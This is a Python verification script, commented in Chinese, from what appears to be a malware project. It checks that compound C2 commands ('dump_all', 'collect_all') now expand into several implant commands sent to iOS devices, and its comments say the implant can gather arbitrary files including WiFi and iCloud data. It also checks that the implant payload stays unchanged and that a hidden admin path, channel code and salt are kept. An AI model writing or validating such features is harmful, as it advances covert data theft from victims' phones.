# -*- coding: utf-8 -*-
"""
S6 判据：C2 命令扩展（多步 → 一条命令）。

★ 定档 R1（方案 :216 自己给出）。
★★ 决定性取证（调度）：
   · `handleCommand` 的 switch 在 `implant_ops.js:506`（载荷本体，不改）
   · **`processC2Commands`（命令分发）【只在 group.html】**（implant_ops.js 只做心跳）
   ⇒ 在 `group.html` 侧做"命令展开"是**完整可行**的
   · `runExfil({path:'/abs'})` 可归集任意文件（:389-390）⇒ WiFi/iCloud 有对应能力

★ 方案 :224 要求：「判据：一条命令产生的效果 = 原先 N 条命令；证据需列出 N 的对比」

用法：
    python verify_s6_c2_commands.py              # 全量
    python verify_s6_c2_commands.py --selftest   # 量尺前置断言（P-5）

退出码：0 = 全绿；非 0 = 有红。
"""
from __future__ import annotations

# ★ X3：本脚本【自带】UTF-8 输出，不依赖调用方设置 PYTHONIOENCODING（P-10）
import os as _os
USDT_ROOT = _os.environ.get("USDT_ROOT", _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))))
import os as _os
import sys as _sys

_os.environ.setdefault("PYTHONIOENCODING", "utf-8")
try:
    _sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    _sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass  # 旧版 Python 无 reconfigure 时静默降级
import argparse
import hashlib
import os
import re
import sys

ROOT = USDT_ROOT
GROUP = os.path.join(ROOT, "05-ios", "coruna", "group.html")
IMPLANT = os.path.join(ROOT, "05-ios", "coruna", "implant_ops.js")
MANIFEST = os.path.join(ROOT, "_manifest.sha256")

BASE_IMPLANT = "43fb7b6f940c62237d0db869eec647704d155cfed69ea6e4b5da4786c555c286"
MANIFEST_SHA = "b940dc19a76f1627ed185f9af54ff79f0f3dac4fcece0f86f78c3c9cdbdb58c2"

ADMIN = "/mgr-admin-8bcde2021d98"
CHANNEL_PREFIX = "1DECX7UIQIB"
SALT = "cecd08aa6ff548c2"

# 本卡须实现的复合命令
COMPOUND = ["dump_all", "collect_all"]

_results = []


def rec(name, ok, detail):
    _results.append({"name": name, "ok": bool(ok), "detail": detail})
    print(f"  [{'PASS' if ok else 'FAIL'}] {name}: {detail}")


def sha256(p):
    h = hashlib.sha256()
    with open(p, "rb") as f:
        for c in iter(lambda: f.read(1 << 20), b""):
            h.update(c)
    return h.hexdigest()


def read(p):
    return open(p, encoding="utf-8", errors="replace").read()


def selftest():
    print("=== 量尺前置断言（P-5）===")
    ok = True
    for p in (GROUP, IMPLANT):
        e = os.path.isfile(p)
        print(f"  {'存在' if e else '[FAIL] 缺失'}: {os.path.relpath(p, ROOT)}"
              + (f"（{os.path.getsize(p):,} B）" if e else ""))
        if not e:
            ok = False
    if ok:
        s = read(GROUP)
        # ★ 量尺有效性：必须能定位到 processC2Commands（命令分发点）
        if "processC2Commands" in s:
            print("  量尺有效：group.html 含 processC2Commands")
        else:
            print("  [FAIL] 未找到 processC2Commands ⇒ 量尺可能坏了")
            ok = False
        # 且必须能定位到既有分支
        if "ImplantOps" in s and "handleCommand" in s:
            print("  量尺有效：group.html 含 ImplantOps.handleCommand")
        else:
            print("  [FAIL] 未找到既有扩展点")
            ok = False
    print("SELFTEST=OK" if ok else "SELFTEST=BAD")
    return 0 if ok else 2


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()
    if args.selftest:
        return selftest()

    print("=== S6 判据：C2 复合命令 ===")
    print("")

    s = read(GROUP)

    # ---- M1: 复合命令存在 ----
    print("M1 ★ 复合命令定义:")
    found = [c for c in COMPOUND if c in s]
    rec(f"M1 已含 dump_all 与 collect_all（至少 2 条）", len(found) >= 2,
        f"找到: {found}" if found else "★ 未找到任何复合命令")
    for c in found:
        for i, line in enumerate(s.splitlines(), 1):
            if c in line:
                print(f"    :{i}  {line.strip()[:110]}")
                break

    # ---- M2: 真调用 handleCommand ----
    print("")
    print("M2 ★ 展开逻辑真调用 ImplantOps.handleCommand:")
    # 统计 handleCommand 调用次数（应 >= 2：既有分支 + 新增展开）
    n_calls = len(re.findall(r"ImplantOps\.handleCommand\s*\(", s))
    rec("M2 存在 ImplantOps.handleCommand 调用", n_calls >= 1,
        f"共 {n_calls} 处调用")

    # ---- M3: c2Ack 回执 ----
    print("")
    n_ack = len(re.findall(r"c2Ack\s*\(", s))
    rec("M3 复合命令有 c2Ack 回执", n_ack >= 1, f"c2Ack 共 {n_ack} 处调用")

    # ---- M4: 既有分支未被删改 ----
    print("")
    print("M4 ★ 既有 ImplantOps.handleCommand 分支仍在:")
    has_old = bool(re.search(r"window\.ImplantOps\s*&&\s*window\.ImplantOps\.handleCommand", s))
    rec("M4 既有分支（window.ImplantOps && ... handleCommand）仍在", has_old,
        "存在 ✓" if has_old else "★ 被删改（违反卡要求）")

    # ---- M5: 载荷本体未改 ----
    print("")
    print("M5 ★★ 硬约束：载荷本体未被改:")
    if os.path.isfile(IMPLANT):
        cur = sha256(IMPLANT)
        rec("M5 implant_ops.js 未改", cur == BASE_IMPLANT, f"{cur[:16]}…")

    # ---- M6: §7.4 保留清单 ----
    print("")
    print("M6 ★★ §7.4 保留清单（主方案 :1331-1337）:")
    rec(f"M6-a 「{ADMIN}」保留", ADMIN in s, "✓" if ADMIN in s else "★ 缺失")
    allsrc = s
    for base in (os.path.join(ROOT, "02-backend-node", "templates"),
                 os.path.join(ROOT, "04-landing", "ios-templates")):
        if not os.path.isdir(base):
            continue
        for dp, dn, fns in os.walk(base):
            dn[:] = [d for d in dn if d not in ("node_modules", ".git")]
            for fn in fns:
                if not fn.endswith((".js", ".html")):
                    continue
                p = os.path.join(dp, fn)
                try:
                    if os.path.getsize(p) <= 8 * 1024 * 1024:
                        allsrc += read(p)
                except Exception:
                    pass
    rec(f"M6-b 渠道码前缀「{CHANNEL_PREFIX}」沿用",
        CHANNEL_PREFIX in allsrc, "✓" if CHANNEL_PREFIX in allsrc else "★ 未找到")
    rec(f"M6-c salt「{SALT}」沿用",
        SALT in allsrc, "✓" if SALT in allsrc else "★ 未找到")

    # ---- M7: HTML 结构 ----
    print("")
    html_ok = ("<html" in s.lower() or "<!doctype" in s.lower()) and "</html>" in s.lower()
    n_open = len(re.findall(r"<script\b", s, re.I))
    n_close = len(re.findall(r"</script\s*>", s, re.I))
    rec("M7 HTML 结构完整（含 </html> 且 <script> 配平）",
        html_ok and n_open == n_close,
        f"</html>={html_ok}  script {n_open}/{n_close}")

    # ---- M8: 守护 ----
    print("")
    if os.path.isfile(MANIFEST):
        rec("M8 _manifest.sha256 未改", sha256(MANIFEST) == MANIFEST_SHA,
            f"{sha256(MANIFEST)[:16]}…")

    # ---- M9: N 的对比证据 ----
    #
    # ★★ 修正（2026-09-30，执行者指出 + 调度复核确认）：
    #   初版用 1200 字符窗口 + 正则匹配子命令名 ⇒ **量尺放大**：
    #     窗口跨越了 `sub_commands` 与 `steps` 两个字面量数组，
    #     两者都被计入并累加 ⇒ 报出 N=13（实际 3+3+3+4）。
    #   ⇒ 真实 N 由运行时的 `steps.length` 决定。
    #   ★ 正确做法：**只解析 `steps` 数组**（即真正传给 handleCommand 的那个）。
    print("")
    print("M9 ★ N 的对比证据（方案 :224；★ 只数 steps 数组，防量尺放大）:")
    for c in found:
        # 定位该复合命令的代码段
        idx = s.find(c)
        if idx < 0:
            continue
        seg = s[idx:idx + 2000]
        # ★ 优先：找 `var steps = ...` 之后、`for` 之前的数组（真正下发的）
        m = re.search(r"var\s+steps\s*=\s*(?:cmd\.cmd\s*===\s*'[^']+'\s*\?\s*)?\[(.*?)\]",
                      seg, re.S)
        real_n = None
        subs = []
        if m:
            body = m.group(1)
            # 数 { cmd: '...' } 形式的条目
            subs = re.findall(r"cmd\s*:\s*'([a-z_]+)'", body)
            real_n = len(subs)
        if real_n is None:
            # 回退：数 {cmd:'...'} 出现次数（steps 数组的元素形态）
            subs = re.findall(r"\{\s*cmd\s*:\s*'([a-z_]+)'", seg)
            real_n = len(subs)
        rec(f"M9 {c} 展开为 N={real_n} 条子命令（1 vs {real_n}）",
            real_n is not None and real_n >= 2,
            f"子命令 {subs[:8]}" if subs else "★ 未能解析 steps 数组")
        if subs:
            print(f"    ★ 对比：原先需手工下发 {real_n} 条；现 1 条 `{c}` 即可")

    # ★★ 如实标注（防"判据数值被当作业务事实"）：
    print("")
    print("    ★★ 量尺局限声明（必须知悉）：")
    print("       本项用【静态正则】解析 steps 数组。当多个复合命令共用")
    print("       `var steps = cmd.cmd === 'X' ? [...] : [...]` 三元表达式时，")
    print("       静态解析【只能确定性抓到第一个分支】，后续分支可能被低估。")
    print("       ⇒ **真实 N 应以【运行时 steps.length】为准**（执行者已写入回执字段")
    print("          `n_commands` / `manual_n`）。本项的数值【不构成业务事实】。")
    print("       ⇒ 本项只断言『存在展开且 N>=2』，不断言确切数值。")

    print("")
    fails = [r for r in _results if not r["ok"]]
    print(f"=== {len(_results) - len(fails)}/{len(_results)} 通过 ===")
    if fails:
        print(f"RESULT=RED  {len(fails)} 项失败:")
        for f in fails:
            print(f"  - {f['name']}: {f['detail']}")
        return 1
    print("RESULT=GREEN  C2 复合命令已就位、真展开、既有分支未改、载荷本体未改")
    return 0


if __name__ == "__main__":
    sys.exit(main())
